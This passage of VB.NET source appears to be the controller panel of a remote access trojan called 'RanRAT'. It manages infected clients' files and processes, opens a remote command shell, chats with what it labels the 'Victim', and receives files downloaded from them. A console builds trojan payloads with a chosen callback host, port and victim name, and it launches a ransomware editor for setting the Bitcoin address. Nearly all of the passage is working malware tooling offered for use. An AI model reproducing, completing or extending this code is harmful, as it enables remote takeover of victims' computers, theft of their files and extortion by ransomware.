                            ElseIf itm.Text.EndsWith(".bin") Or itm.Text.EndsWith(".BIN") Or itm.Text.EndsWith(".bak") Or itm.Text.EndsWith(".BAK") Or itm.Text.EndsWith(".dat") Or itm.Text.EndsWith(".DAT") Then
                                itm.ImageIndex = 13
                            ElseIf itm.Text.EndsWith(".xlsx") Or itm.Text.EndsWith(".XLSX") Or itm.Text.EndsWith(".xlsm") Or itm.Text.EndsWith(".XLSM") Or itm.Text.EndsWith(".xlsb") Or itm.Text.EndsWith(".XLSB") Or itm.Text.EndsWith(".xltm") Or itm.Text.EndsWith(".XLTM") Or itm.Text.EndsWith(".xlam") Or itm.Text.EndsWith(".XLAM") Or itm.Text.EndsWith(".xltx") Or itm.Text.EndsWith(".XLTX") Or itm.Text.EndsWith(".xll") Or itm.Text.EndsWith(".XLL") Then
                                itm.ImageIndex = 14
                            ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".DOC") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".RTF") Or itm.Text.EndsWith(".docx") Or itm.Text.EndsWith(".DOCX") Or itm.Text.EndsWith(".docm") Or itm.Text.EndsWith(".DOCM") Or itm.Text.EndsWith(".psw") Or itm.Text.EndsWith(".PSW") Or itm.Text.EndsWith(".dot") Or itm.Text.EndsWith(".DOT") Or itm.Text.EndsWith(".dotx") Or itm.Text.EndsWith(".DOTX") Or itm.Text.EndsWith(".dotm") Or itm.Text.EndsWith(".DOTM") Then
                                itm.ImageIndex = 15
                            ElseIf itm.Text.EndsWith(".ini") Or itm.Text.EndsWith(".INI") Or itm.Text.EndsWith(".sys") Or itm.Text.EndsWith(".SYS") Or itm.Text.EndsWith(".css") Or itm.Text.EndsWith(".CSS") Or itm.Text.EndsWith(".inf") Or itm.Text.EndsWith(".INF") Then
                                itm.ImageIndex = 16
                            ElseIf itm.Text.EndsWith(".pdf") Or itm.Text.EndsWith(".PDF") Then
                                itm.ImageIndex = 17
                            ElseIf itm.Text.EndsWith(".pptx") Or itm.Text.EndsWith(".PPTX") Or itm.Text.EndsWith(".ppt") Or itm.Text.EndsWith(".PPT") Or itm.Text.EndsWith(".pps") Or itm.Text.EndsWith(".PPS") Or itm.Text.EndsWith(".pptm") Or itm.Text.EndsWith(".PPTM") Or itm.Text.EndsWith(".potx") Or itm.Text.EndsWith(".POTX") Or itm.Text.EndsWith(".potm") Or itm.Text.EndsWith(".POTM") Or itm.Text.EndsWith(".ppam") Or itm.Text.EndsWith(".PPAM") Or itm.Text.EndsWith(".ppsx") Or itm.Text.EndsWith(".PPSX") Or itm.Text.EndsWith(".ppsm") Or itm.Text.EndsWith(".PPSM") Then
                                itm.ImageIndex = 18
                            ElseIf itm.Text.EndsWith(".swf") Or itm.Text.EndsWith(".SWF") Or itm.Text.EndsWith(".htm") Or itm.Text.EndsWith(".HTM") Or itm.Text.EndsWith(".html") Or itm.Text.EndsWith(".HTML") Then
                                itm.ImageIndex = 20
                            ElseIf itm.Text.EndsWith(".reg") Or itm.Text.EndsWith(".REG") Then
                                itm.ImageIndex = 19
                            ElseIf itm.Text.EndsWith(".AACCDB") Or itm.Text.EndsWith(".aaccdb") Or itm.Text.EndsWith(".ACCDE") Or itm.Text.EndsWith(".accde") Or itm.Text.EndsWith(".ACCDT") Or itm.Text.EndsWith(".accdt") Or itm.Text.EndsWith(".ACCDR") Or itm.Text.EndsWith(".accdr") Then
                                itm.ImageIndex = 21
                            ElseIf itm.Text.EndsWith(".xml") Or itm.Text.EndsWith(".XML") Then
                                itm.ImageIndex = 22
                            ElseIf itm.Text.EndsWith(".odt") Or itm.Text.EndsWith(".ODT") Or itm.Text.EndsWith(".ott") Or itm.Text.EndsWith(".OTT") Or itm.Text.EndsWith(".sxw") Or itm.Text.EndsWith(".SXW") Or itm.Text.EndsWith(".stw") Or itm.Text.EndsWith(".STW") Or itm.Text.EndsWith(".sor") Or itm.Text.EndsWith(".SOR") Or itm.Text.EndsWith(".sxc") Or itm.Text.EndsWith(".SXC") Or itm.Text.EndsWith(".stc") Or itm.Text.EndsWith(".STC") Or itm.Text.EndsWith(".sxi") Or itm.Text.EndsWith(".SXI") Or itm.Text.EndsWith(".sti") Or itm.Text.EndsWith(".STI") Or itm.Text.EndsWith(".sxd") Or itm.Text.EndsWith(".SXD") Or itm.Text.EndsWith(".std") Or itm.Text.EndsWith(".STD") Or itm.Text.EndsWith(".sxg") Or itm.Text.EndsWith(".SXG") Then
                                itm.ImageIndex = 23
                            ElseIf itm.Text.EndsWith(".temp") Or itm.Text.EndsWith(".TEMP") Or itm.Text.EndsWith(".tmp") Or itm.Text.EndsWith(".TMP") Then
                                itm.ImageIndex = 24
                            ElseIf itm.Text.EndsWith(".iso") Or itm.Text.EndsWith(".ISO") Then
                                itm.ImageIndex = 25
                            ElseIf itm.Text.EndsWith(".save") Or itm.Text.EndsWith(".SAVE") Or itm.Text.EndsWith(".sav") Or itm.Text.EndsWith(".SAV") Then
                                itm.ImageIndex = 26
                            ElseIf itm.Text.EndsWith(".crt") Or itm.Text.EndsWith(".CRT") Then
                                itm.ImageIndex = 27
                            ElseIf itm.Text.EndsWith(".js") Or itm.Text.EndsWith(".JS") Then
                                itm.ImageIndex = 28
                            ElseIf itm.Text.EndsWith(".cat") Or itm.Text.EndsWith(".CAT") Then
                                itm.ImageIndex = 29
                            ElseIf itm.Text.EndsWith(".chm") Or itm.Text.EndsWith(".CHM") Then
                                itm.ImageIndex = 30
                            ElseIf itm.Text.EndsWith(".vmdk") Or itm.Text.EndsWith(".VMDK") Then
                                itm.ImageIndex = 31
                            ElseIf itm.Text.EndsWith(".vmx") Or itm.Text.EndsWith(".VMX") Then
                                itm.ImageIndex = 32
                            ElseIf itm.Text.EndsWith(".vbs") Or itm.Text.EndsWith(".VBS") Or itm.Text.EndsWith(".vbe") Or itm.Text.EndsWith(".VBE") Or itm.Text.EndsWith(".wsf") Or itm.Text.EndsWith(".WSF") Or itm.Text.EndsWith(".wsc") Or itm.Text.EndsWith(".WSC") Then
                                itm.ImageIndex = 33
                            ElseIf itm.Text.EndsWith(".nfo") Or itm.Text.EndsWith(".NFO") Then
                                itm.ImageIndex = 34
                            ElseIf itm.Text.EndsWith(".sln") Or itm.Text.EndsWith(".SLN") Then
                                itm.ImageIndex = 35
                            ElseIf itm.Text.EndsWith(".vb") Or itm.Text.EndsWith(".VB") Then
                                itm.ImageIndex = 36
                            ElseIf itm.Text.EndsWith(".resx") Or itm.Text.EndsWith(".RESX") Then
                                itm.ImageIndex = 37
                            ElseIf itm.Text.EndsWith(".config") Or itm.Text.EndsWith(".CONFIG") Then
                                itm.ImageIndex = 38
                            ElseIf itm.Text.EndsWith(".vbproj") Or itm.Text.EndsWith(".VBPROJ") Then
                                itm.ImageIndex = 39
                            ElseIf itm.Text.EndsWith(".settings") Or itm.Text.EndsWith(".SETTINGS") Then
                                itm.ImageIndex = 40
                            ElseIf itm.Text.EndsWith(".user") Or itm.Text.EndsWith(".USER") Or itm.Text.EndsWith(".suo") Or itm.Text.EndsWith(".SUO") Then
                                itm.ImageIndex = 41
                            ElseIf itm.Text.EndsWith(".pdb") Or itm.Text.EndsWith(".PDB") Then
                                itm.ImageIndex = 42
                            ElseIf itm.Text.EndsWith(".xslt") Or itm.Text.EndsWith(".XSLT") Then
                                itm.ImageIndex = 43
                            ElseIf itm.Text.EndsWith(".obj") Or itm.Text.EndsWith(".OBJ") Then
                                itm.ImageIndex = 44
                            ElseIf itm.Text.EndsWith(".rc") Or itm.Text.EndsWith(".RC") Then
                                itm.ImageIndex = 45
                            ElseIf itm.Text.EndsWith(".inc") Or itm.Text.EndsWith(".INC") Or itm.Text.EndsWith(".lst") Or itm.Text.EndsWith(".LST") Then
                                itm.ImageIndex = 46
                            ElseIf itm.Text.EndsWith(".res") Or itm.Text.EndsWith(".RES") Then
                                itm.ImageIndex = 47
                            ElseIf itm.Text.EndsWith(".mdmp") Or itm.Text.EndsWith(".MDMP") Then
                                itm.ImageIndex = 48
                            ElseIf itm.Text.EndsWith(".ResmonCfg") Or itm.Text.EndsWith(".RESMONCFG") Then
                                itm.ImageIndex = 49
                            ElseIf itm.Text.EndsWith(".conf") Or itm.Text.EndsWith(".CONF") Or itm.Text.EndsWith(".leases") Or itm.Text.EndsWith(".LEASES") Then
                                itm.ImageIndex = 50
                            ElseIf itm.Text.EndsWith(".cur") Or itm.Text.EndsWith(".CUR") Then
                                itm.ImageIndex = 51
                            ElseIf itm.Text.EndsWith(".ani") Or itm.Text.EndsWith(".ANI") Then
                                itm.ImageIndex = 52
                            ElseIf itm.Text.EndsWith(".url") Or itm.Text.EndsWith(".URL") Then
                                itm.ImageIndex = 53
                            ElseIf itm.Text.EndsWith(".ttf") Or itm.Text.EndsWith(".TTF") Or itm.Text.EndsWith(".otf") Or itm.Text.EndsWith(".OTF") Then
                                itm.ImageIndex = 54
                            ElseIf itm.Text.EndsWith(".blend") Or itm.Text.EndsWith(".BLEND") Then
                                itm.ImageIndex = 55
                            ElseIf itm.Text.EndsWith(".icc") Or itm.Text.EndsWith(".ICC") Then
                                itm.ImageIndex = 56
                            ElseIf itm.Text.EndsWith(".a3x") Or itm.Text.EndsWith(".A3X") Or itm.Text.EndsWith(".au3") Or itm.Text.EndsWith(".AU3") Then
                                itm.ImageIndex = 57
                            Else
                                itm.ImageIndex = 8

                            End If

                            fff.ListView1.Items.Add(itm)
                            i += 1

                        Next

                    End If
                Case "edittextfile"
                    If My.Application.OpenForms("Text_Editor" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim texter As New Text_Editor
                    texter.sock = sock
                    texter.Name = "Text_Editor" & sock
                    texter.Text = texter.Text & " " & a(1) & " " & s.IP(sock)
                    texter.pathoftext = a(1)
                    texter.TextBox1.Text = a(2)
                    'texter.Text &= " For : " & s.IP(sock)
                    texter.Show()


                Case "fiprop"
                    If My.Application.OpenForms("fiprop" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim fileprop As New fiprop
                    fileprop.sock = sock
                    fileprop.Name = "fiprop" & sock
                    fileprop.Text = fileprop.Text & " " & a(1) & " " & s.IP(sock)
                    fileprop.Label1.Text = a(7)
                    fileprop.Label3.Text = a(8)
                    If a(8).Equals("File Folder") Then
                        fileprop.PictureBox1.Image = fileprop.PictureBox2.Image
                    Else
                        fileprop.PictureBox1.Image = fileprop.PictureBox3.Image
                    End If
                    Dim Cre As String = "Time : " & a(2) & " Date : " & a(1)
                    fileprop.Label5.Text = Cre
                    Dim Crex As String = "Time : " & a(4) & " Date : " & a(3)
                    fileprop.Label7.Text = Crex
                    Dim Crea As String = "Time : " & a(6) & " Date : " & a(5)
                    fileprop.Label9.Text = Crea

                    'texter.Text &= " For : " & s.IP(sock)
                    fileprop.Show()
                Case "ProcessManager"
                    Dim f As ProcessManager = My.Application.OpenForms("\\" & sock)
                    Dim allProcess As String() = Split(a(1), "ProcessSplit") 'Message.Substring(15).Split("ProcessSplit")
                    For i = 0 To allProcess.Length - 2
                        Dim itm As New ListViewItem
                        itm.Text = allProcess(i)
                        itm.SubItems.Add(allProcess(i + 1))
                        itm.SubItems.Add(allProcess(i + 2))
                        itm.SubItems.Add(allProcess(i + 3))
                        itm.ImageIndex = 0
                        f.ListView1.Items.Add(itm)
                        i += 3
                    Next
                Case "\\"
                    If My.Application.OpenForms("\\" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim f As New ProcessManager
                    f.sock = sock
                    f.Name = "\\" & sock
                    ' f.Text &= s.IP(sock)
                    f.Text &= " For " & s.IP(sock)
                    f.Show()
                Case "rss"
                    If My.Application.OpenForms("rs" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim cmd As New Command_Prompt
                    cmd.sock = sock
                    cmd.Name = "rs" & sock
                    '  cmd.Text = cmd.T2.Text
                    cmd.Text &= "  " & s.IP(sock)
                    cmd.Show()

                Case "rs"
                    Dim shl2 As Command_Prompt = My.Application.OpenForms("rs" & sock)
                    If (Not shl2 Is Nothing) Then
                        Dim box As RichTextBox = shl2.T1
                        SyncLock box
                            shl2.T1.SelectionStart = shl2.T1.TextLength
                            shl2.T1.AppendText((DEB(a(1).Replace(ChrW(13) & ChrW(10), "")) & ChrW(13) & ChrW(10)))
                            shl2.T1.SelectionStart = shl2.T1.TextLength
                            shl2.T1.ScrollToCaret()
                        End SyncLock
                    End If
                    Return
                Case "rsc"
                    Dim shl3 As Command_Prompt = My.Application.OpenForms("rs" & sock)
                    If (Not shl3 Is Nothing) Then
                        shl3.Close()
                    End If

                Case "chatback"
                    'MessageBox.Show("New cht message ", "Victim Replied ", MessageBoxButtons.OK, MessageBoxIcon.Information)
                    Dim Ff As Chat = My.Application.OpenForms("Chat" & sock)

                    Ff.TextBox1.Text &= "Victim Said: " & a(1)
                    Invoke(New chatappd(AddressOf chatappds), a(1))
                    Exit Sub
                Case "readytochat"
                    If My.Application.OpenForms("Chat" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim fm As New Chat
                    fm.sock = sock
                    fm.Name = "Chat" & sock
                    'fm.Text = fm.Text & " " & s.IP(sock)
                    fm.Text &= " With " & s.IP(sock)
                    fm.Show()
                Case "downloadedfile"
                    IO.File.WriteAllBytes(Application.StartupPath & "\SbLj-RAT\" & a(2), Convert.FromBase64String(a(1)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                Case Else
                    's.CDis(sock)
                    Return
            End Select
        Catch ex As Exception
            MsgBox("e" & ex.Message)
        End Try
    End Sub
    Public Shared Function DEB(ByRef s As String) As String
        Dim str As String
        Dim num As Integer = 0
Label_0002:
        Try
            Dim bytes As Byte() = Convert.FromBase64String(s)
            str = Encoding.UTF8.GetString(bytes)
        Catch exception1 As Exception
            Dim exception As Exception = exception1
            num += 1
            If (num = 3) Then
                str = Nothing
            Else
                s = (s & "=")
                GoTo Label_0002
            End If
        End Try
        Return str
    End Function



    '################## End Core


    Private Sub Button8_Click(sender As System.Object, e As System.EventArgs)
        Try
            Dim po = InputBox("Enter Port", "RanRAT", 1177)
            localport = Integer.Parse(po)
            s.Start(localport)
            Me.Text &= " Listening on : " & localport
        Catch ex As Exception
            MsgBox("Invalid port entry , 1177 will be used")
            localport = 1177
            Me.Text &= " Listening on : " & localport
            s.Start(localport)
        End Try

    End Sub
    '###############################################################################
    '################################### Commander #################################
    Dim counter As Integer = 0
    Friend Sub getupdatex()
        getUpdate()
    End Sub
    Private Sub hidetaskbar()

    End Sub
    Private Sub showtaskbar()

    End Sub
    Private Sub RichTextBox1_KeyDown(sender As System.Object, e As System.Windows.Forms.KeyEventArgs) Handles RichTextBox1.KeyDown
        Dim command As String = ""
        If e.KeyCode = Keys.Down Or e.KeyCode = Keys.Left Or e.KeyCode = Keys.Right Then
            e.SuppressKeyPress = True

            counter += 1
            Try
                Dim lines As String() = RichTextBox1.Lines
                lines((RichTextBox1.Lines.Length) - 1) = ""
                RichTextBox1.Lines = lines
                RichTextBox1.AppendText("RanRAT@" & Environment.UserName & ": " & logger.Lines(counter))
                RichTextBox1.ScrollToCaret()
            Catch ex As Exception
                counter -= 1

                Try
                    Dim lines As String() = RichTextBox1.Lines
                    lines((RichTextBox1.Lines.Length) - 1) = ""
                    RichTextBox1.Lines = lines
                    RichTextBox1.AppendText("RanRAT@" & Environment.UserName & ": ")
                    RichTextBox1.ScrollToCaret()
                Catch exx As Exception
                    RichTextBox1.Text = "RanRAT@" & Environment.UserName & ": "
                    RichTextBox1.ScrollToCaret()
                End Try
            End Try


            '############# End Down

        End If


        If e.KeyCode = Keys.Up Then

            e.SuppressKeyPress = True

            counter -= 1

            Try
                Dim lines As String() = RichTextBox1.Lines
                lines((RichTextBox1.Lines.Length) - 1) = ""
                RichTextBox1.Lines = lines
                RichTextBox1.AppendText("RanRAT@" & Environment.UserName & ": " & logger.Lines(counter))
                RichTextBox1.ScrollToCaret()

            Catch ex As Exception
                counter += 1

                Try
                    Dim lines As String() = RichTextBox1.Lines
                    lines((RichTextBox1.Lines.Length) - 1) = ""
                    RichTextBox1.Lines = lines
                    RichTextBox1.AppendText("RanRAT@" & Environment.UserName & ": ")
                    RichTextBox1.ScrollToCaret()
                Catch exx As Exception
                    RichTextBox1.Text = "RanRAT@" & Environment.UserName & ": "
                    RichTextBox1.ScrollToCaret()
                End Try
            End Try

            '############# End Up


        End If
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True
            Dim last As String = RichTextBox1.Lines((RichTextBox1.Lines.Length) - 1)
            command = last.Replace("RanRAT@" & Environment.UserName & ": ", "")


            ConsoleCommandListener(command)
            command = ""

        End If

        If e.KeyCode = Keys.Back Or e.KeyCode = Keys.Delete Then
            Dim dl As String = Environment.UserName
            If (RichTextBox1.Text.Substring(RichTextBox1.Text.Length - (Environment.UserName.Length + 2))).Equals(dl & ": ") Then
                e.SuppressKeyPress = True
                HoldDele()
            Else
                Exit Sub
            End If
        End If

    End Sub
    Private Sub saveout()
        If savable = True Then
            Buildtrojan.saveout()
        Else
            RichTextBox1.AppendText("Settings Cannot be saved Either using the GUI " & vbNewLine)
            RichTextBox1.AppendText(vbNewLine & "RanRAT@" & Environment.UserName & ": ")
            Buildtrojan.Show()
            savable = True
        End If

    End Sub

    Private Sub HoldDele()

        Dim lines As String() = RichTextBox1.Lines
        lines((RichTextBox1.Lines.Length) - 1) = ""
        RichTextBox1.Lines = lines
        RichTextBox1.AppendText("RanRAT@" & Environment.UserName & ": ")
        RichTextBox1.ScrollToCaret()
    End Sub
    Private Sub ConsoleCommandListener(ByVal command As String)
        On Error Resume Next
        RichTextBox1.AppendText(vbNewLine)
        logger.AppendText(command & vbNewLine)

        If command.Contains("set -h ") Then

            BuilderHost = command.Replace("set -h ", "")
            command = "set -h"
        End If
        If command.Contains("set -p ") Then
            BuilderPort = Integer.Parse(command.Replace("set -p ", ""))
            command = "set -p"
        End If
        If command.Contains("set -n ") Then
            BuilderName = command.Replace("set -n ", "")
            command = "set -n"
        End If
        If command.Contains("li -p ") Then
            If command.Contains("False") Then
                command = "li -p -Res=False"
            End If
            If command.Contains("True") Then
                ServerPort = Integer.Parse(command.Replace("li -p ", "").Replace(" -Res=True", ""))
                command = "li -p -Res=Yes"
            End If
            ServerPort = Integer.Parse(command.Replace("li -p ", "").Replace(" -Res=Yes", ""))
            command = "li -p -Res=Yes"
        End If
        If command.Contains("Rcountry -v ") Then
            If command.Contains("Rcountry -v ") And command.Contains(" -R") Then

                Dim codel As String = command.Replace("Rcountry -v ", "").Replace(" -R", "")
                If ListBox2.Items.Contains(codel) = True Then
                    ListBox2.Items.Remove(codel)
                    ListBox2.Update()
                    RichTextBox1.AppendText("Country : " & codel & " removed from country list" & vbNewLine)
                    command = "Rcountry -v"
                Else
                    RichTextBox1.AppendText("Country : " & codel & " not exist in country list" & vbNewLine)

                    command = "Rcountry -v"
                End If

            End If

            If command.Contains("Rcountry -v ") And command.Contains(" -A") Then

                Dim codel As String = command.Replace("Rcountry -v ", "").Replace(" -A", "")
                If ListBox2.Items.Contains(codel) = False Then
                    ListBox2.Items.Add(codel)
                    ListBox2.Update()
                    RichTextBox1.AppendText("Country : " & codel & " added to  country list" & vbNewLine)
                    command = "Rcountry -v"
                Else
                    RichTextBox1.AppendText("Country : " & codel & " exists in country list" & vbNewLine)
                    command = "Rcountry -v"
                End If

            End If

        End If
        If localport <> ServerPort Then
            localport = ServerPort
        End If


        Select Case UCase(command)

            Case "?"
            Case "HELP"
                RichTextBox1.AppendText("-- help, Views commands list [Case / Spaces  are senstive" & vbNewLine)
                RichTextBox1.AppendText("-- use, Use program  availabilities in console " & vbNewLine)
                RichTextBox1.AppendText("-- show options, Views payload options Host,Port,Name" & vbNewLine)
                RichTextBox1.AppendText("-- li -p -Res=Yes, Change listen port [Reqiures Restart]" & vbNewLine)
                RichTextBox1.AppendText("-- clear -c, Clears Console Text" & vbNewLine)
                RichTextBox1.AppendText("-- clear -m, Clears Console Commands Memory" & vbNewLine)
                RichTextBox1.AppendText("-- clear -l, Clears Client connection logs" & vbNewLine)
                RichTextBox1.AppendText("-- save out, Saves payload file to Desktop" & vbNewLine)
                RichTextBox1.AppendText("-- save settings, Saves current settings" & vbNewLine)
                RichTextBox1.AppendText("-- countryli, Use Country List Editor" & vbNewLine)
                RichTextBox1.AppendText("-- start -li, Start listen on port" & vbNewLine)
                RichTextBox1.AppendText("-- start -li -Auto=Yes/No, Start listen on port" & vbNewLine)
                RichTextBox1.AppendText("-- signout , Log the Current user out of the session , Back to login" & vbNewLine)
                RichTextBox1.AppendText("-- out , Log the Current user out of the session , Back to login [Clear user`s Entry]" & vbNewLine)
                RichTextBox1.AppendText("-- Rcountry -v [Country name] -R, Remove country from country list" & vbNewLine)
                RichTextBox1.AppendText("-- Rcountry -v [Country name] -A, Add country from country list" & vbNewLine)
                RichTextBox1.AppendText("-- Hackermode -true, Start Fullscreen Hacker Mode [Mapping Clients]" & vbNewLine)
                RichTextBox1.AppendText("-- Hackermode -fs, Start Fullscreen Mode [Not Mapping Clients]" & vbNewLine)
                RichTextBox1.AppendText("-- Hackermode -n, End Fullscreen  Mode [Not Mapping Clients]" & vbNewLine)
            Case "USE"
                RichTextBox1.AppendText("-- use , Use program  availabilities in console" & vbNewLine)
                RichTextBox1.AppendText("-- use payload , Use payload builder" & vbNewLine)
                RichTextBox1.AppendText("-- use ran , Use Ransomware Editor Edit Bitcoin Address Or Wallpaper" & vbNewLine)

            Case "USE PAYLOAD"
                RichTextBox1.AppendText("-- use payload , Use payload builder" & vbNewLine)
                RichTextBox1.AppendText("-- use payload set , Use payload builder" & vbNewLine)
                RichTextBox1.AppendText("-- help , Views commands list" & vbNewLine)

            Case "USE PAYLOAD SET"
                RichTextBox1.AppendText("-- set -h '" & BuilderHost & "'  , Payload DNS / HOST / NO-IP" & vbNewLine)
                RichTextBox1.AppendText("-- set -p 'port'  , Payload Port ." & vbNewLine)
                RichTextBox1.AppendText("-- set -n 'payload name'  , Payload name / Victim name " & vbNewLine)
                RichTextBox1.AppendText("-- help , Views commands list" & vbNewLine)
            Case (UCase("set -h"))
                RichTextBox1.AppendText("Payload Host Set to : '" & BuilderHost & "'  , True" & vbNewLine)
                RichTextBox1.AppendText("-- show options , Views payload options Host,Port,Name" & vbNewLine)
            Case (UCase("set -p"))
                RichTextBox1.AppendText("payload Port Set to : '" & BuilderPort & "'  , True" & vbNewLine)
                RichTextBox1.AppendText("-- show options , Views payload options Host,Port,Name" & vbNewLine)
            Case (UCase("set -n"))
                RichTextBox1.AppendText("Payload name Set to : '" & BuilderName & "'  , True" & vbNewLine)
                RichTextBox1.AppendText("-- show options , Views payload options Host,Port,Name" & vbNewLine)
            Case (UCase("save out"))
                RichTextBox1.AppendText("-- save out , Saves payload file to Desktop" & vbNewLine)
                'save trojan out to desktop
                saveout()
            Case UCase("show options")
                RichTextBox1.AppendText("Payload Host : " & BuilderHost & vbNewLine)
                RichTextBox1.AppendText("Payload Port : " & BuilderPort & vbNewLine)
                RichTextBox1.AppendText("Payload Name : " & BuilderName & vbNewLine)
                RichTextBox1.AppendText("Listner Port : " & ServerPort & vbNewLine)


            Case UCase("clear")
                RichTextBox1.AppendText("-- clear -c , Clears Console Text" & vbNewLine)
                RichTextBox1.AppendText("-- clear -m , Clears Console Commands Memory" & vbNewLine)
                RichTextBox1.AppendText("-- clear -l , Clears Client connection logs" & vbNewLine)
                RichTextBox1.AppendText("-- help , Views commands list" & vbNewLine)
                RichTextBox1.AppendText("Type : help" & vbNewLine)

            Case UCase("hackermode -fs")
                RichTextBox1.AppendText("Deactivated Hacker Mode = True , Fullscreen = True" & vbNewLine)
                fs()
            Case UCase("hackermode -n")
                RichTextBox1.AppendText("Deactivated Hacker Mode = True , Fullscreen = False" & vbNewLine)
                n()
            Case UCase("Hackermode -true")
                RichTextBox1.AppendText("Deactivated Hacker Mode = False , Fullscreen = False" & vbNewLine)
                MapGadget.Show()
            Case UCase("Hackermode ")
                RichTextBox1.AppendText("Deactivated Hacker Mode = False , Fullscreen = False" & vbNewLine)
                MapGadget.Show()
            Case UCase("Hackermode")
                RichTextBox1.AppendText("Deactivated Hacker Mode = False , Fullscreen = False" & vbNewLine)
                MapGadget.Show()
            Case UCase("Hackermode -false")
                RichTextBox1.AppendText("Deactivated Hacker Mode = True , Fullscreen = False" & vbNewLine)

            Case UCase("clear -c")
                RichTextBox1.Text = ""
                RichTextBox1.ScrollToCaret()
            Case UCase("clear -m")
                logger.Text = ""
            Case UCase("clear -l")
                ListBox1.Items.Clear()

            Case UCase("li -p -Res=No")
            Case UCase("li -p -Res=No ")
            Case UCase("li -p -Res=Yes ")
            Case UCase("li -p -Res=Yes")
                RichTextBox1.AppendText("Listener Port  Set to : '" & ServerPort & "'  , True" & vbNewLine)
                RichTextBox1.AppendText("-- show options , Views payload options Host,Port,Name" & vbNewLine)
                Dim allsett As String = BuilderHost & "#######" & BuilderPort & "#######" & BuilderName & "#######" & ServerPort & "#######"
                IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "/Config.cfg", allsett)
                RichTextBox1.AppendText("Settings Saved Successfully." & vbNewLine)


                My.Settings.Rcommand = "1"
                Application.Restart()
                'restarts and changes listenport

            Case UCase("save settings")
                Dim allsett As String = BuilderHost & "#######" & BuilderPort & "#######" & BuilderName & "#######" & ServerPort & "#######"
                IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "/Config.cfg", allsett)
                RichTextBox1.AppendText("Settings Saved Successfully." & vbNewLine)
            Case UCase("use ran")
                RichTextBox1.AppendText("-- use ran -e , Use Ransomware Editor for Bitcoin , Extention ." & vbNewLine)
                RichTextBox1.AppendText("-- use ran -g , Use Ransomware GUI Designer to Edit Ransomware GUI" & vbNewLine)
                RichTextBox1.AppendText("-- help , Views commands list" & vbNewLine)

            Case UCase("use ran -e")
                RichTextBox1.AppendText("Ransomware Data editor Activated" & vbNewLine)
                RasomwareEditor.Show()
            Case UCase("use ran -g")
                RichTextBox1.AppendText("Ransomware GUI editor Activated" & vbNewLine)
                RanE()
                If URan = False Then
                    If IO.File.Exists(RanosmwarePath) Then
                        URan = True
                    End If
                End If
            Case UCase("countryli")
                RichTextBox1.AppendText("Country List editor Activated" & vbNewLine)
                countrylist.Show()
            Case UCase("start -li")
                RichTextBox1.AppendText("Handler Started on port : " & localport & "." & vbNewLine)
                StartListen(localport)

            Case UCase("start -li -Auto=Yes")
            Case UCase("start -li -Auto = Yes")
            Case UCase("start -li -Auto = Yes ")
                RichTextBox1.AppendText("Auto Handler activated , On : " & localport & "." & vbNewLine)

            Case UCase("update -Access=False ")
            Case UCase("update -Access=True ")
            Case UCase("update ")
            Case UCase("update")
                getUpdate()
            Case UCase("start -li -Auto=No")
            Case UCase("start -li -Auto = No")
            Case UCase("start -li -Auto = No ")
                RichTextBox1.AppendText("Auto Handler deactivated , Off : " & localport & "." & vbNewLine)

            Case UCase("Rcountry -v")
                GoTo ReturnLine
            Case UCase("signout")
                signout()
            Case UCase("out")
                out()
            Case Else
                RichTextBox1.AppendText("Command : '" & command & "' is not recognized as an internal command." & vbNewLine)
                RichTextBox1.AppendText("-- help , Views commands list" & vbNewLine)
                RichTextBox1.AppendText("Type : help" & vbNewLine)
        End Select
ReturnLine:

        RichTextBox1.AppendText(vbNewLine & "RanRAT@" & Environment.UserName & ": ")

        RichTextBox1.ScrollToCaret()
    End Sub
    Private Sub signout()
        issign = True
        Me.Close()
        Login.Show()
        Me.s = Nothing
    End Sub
    Private Sub out()
        issign = True
        Me.Close()
        Me.s = Nothing
        Login.Show()
        Login.clout()
    End Sub
    Private Sub RanE()
        If IO.File.Exists(RanosmwareEditorPath) = False Then
            File.WriteAllBytes(RanosmwareEditorPath, My.Resources.nRansomwarexEditor)
            Process.Start(RanosmwareEditorPath)
        Else
            IO.File.Delete(RanosmwareEditorPath)
            File.WriteAllBytes(RanosmwareEditorPath, My.Resources.nRansomwarexEditor)
            Process.Start(RanosmwareEditorPath)
        End If

    End Sub
    Private Sub scoller_Tick(sender As System.Object, e As System.EventArgs) Handles scoller.Tick
        RichTextBox1.ScrollToCaret()
    End Sub
    Private Sub fs()
        Me.WindowState = FormWindowState.Maximized
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.TopMost = True
        Me.FormBorderStyle = FormBorderStyle.None
    End Sub
    Private Sub n()
        Me.WindowState = FormWindowState.Normal
        Me.ShowIcon = True
        Me.ShowInTaskbar = True
        Me.TopMost = False
        Me.FormBorderStyle = FormBorderStyle.Sizable
    End Sub
    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs)
        On Error Resume Next

        Dim o As New OpenFileDialog
        o.ShowDialog()
        Dim n As New IO.FileInfo(o.FileName)
        If o.FileName.Length > 0 Then
            Dim filepath As String = o.FileName
            Label2.Text = filepath
            CheckBox1.Enabled = True
        End If


    End Sub
    Public Sub ACvQRTLeTBGH(ByVal AtFasfrGgK As String)
        Addcountry(AtFasfrGgK)
    End Sub
    Private Sub Addcountry(ByVal country As String)
        If ListBox2.Items.Contains(country) = False Then
